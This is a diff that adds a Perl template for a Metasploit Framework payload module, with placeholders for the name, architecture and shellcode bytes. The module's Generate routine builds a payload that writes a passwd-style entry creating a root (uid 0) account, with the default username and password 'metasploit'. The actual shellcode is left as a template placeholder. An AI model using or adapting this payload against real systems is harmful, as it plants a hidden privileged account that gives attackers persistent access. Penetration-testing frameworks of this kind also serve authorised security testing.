@@ -1,0 +1,78 @@
+
+##
+# This file is part of the Metasploit Framework and may be redistributed
+# according to the licenses defined in the Authors field below. In the
+# case of an unknown or missing license, this file defaults to the same
+# license as the core Framework (dual GPLv2 and Artistic). The latest
+# version of the Framework can always be obtained from metasploit.com.
+##
+
+package Msf::Payload::__NAME__;
+use strict;
+use base 'Msf::PayloadComponent::NoConnection';
+use Pex::x86;
+
+my $info =
+{
+  'Name'         => '__SHORTNAME__',
+  'Version'      => '$Revision: 1513 $',
+  'Description'  => '__DESCRIPTION__',
+  'Authors'      => [ __AUTHORS__ ],
+  'Arch'         => [ '__ARCH__' ],
+  'Priv'         => 1,
+  'OS'           => [ '__OS__' ],
+  'Size'         => '',
+  'UserOpts'     =>
+   {
+      'USER'  => [1, 'DATA', 'The username to create',     'metasploit'],
+      'PASS'  => [1, 'DATA', 'The password for this user', 'metasploit'],
+      'SHELL' => [0, 'DATA', 'The shell for this user',    '/bin/sh'],
+   },
+};
+
+sub new {
+  my $class = shift;
+  my $hash = @_ ? shift : { };
+  $hash = $class->MergeHashRec($hash, {'Info' => $info});
+  my $self = $class->SUPER::new($hash, @_);
+
+  $self->_Info->{'Size'} = $self->_GenSize;
+  return($self);
+}
+
+sub Build {
+  my $self = shift;
+  return($self->Generate());
+}
+
+sub Generate {
+  my $self = shift;
+  my $user = $self->GetVar('USER') || 'metasploit';
+  my $pass = $self->GetVar('PASS');
+  my $shell = $self->GetVar('SHELL') || '/bin/sh';
+  my $str = $user . ":" . crypt($pass, "AA") . ":0:0::/:" . $shell . "\n";
+
+  my $shellcode =
+__HEX__;
+
+  my $front = substr($shellcode, 0, __CUSTOM1__);
+  my $back  = substr($shellcode, __CUSTOM2__, length($shellcode) - __CUSTOM2__);
+
+  $shellcode = $front . 
+    Pex::x86::call(length($str)) .
+    $str .
+    $back;
+  
+  return($shellcode);
+}
+
+sub _GenSize {
+  my $self = shift;
+  my $bin = $self->Generate('');
+  return(length($bin));
+}
+
+__DISASM__
+
+1;
+
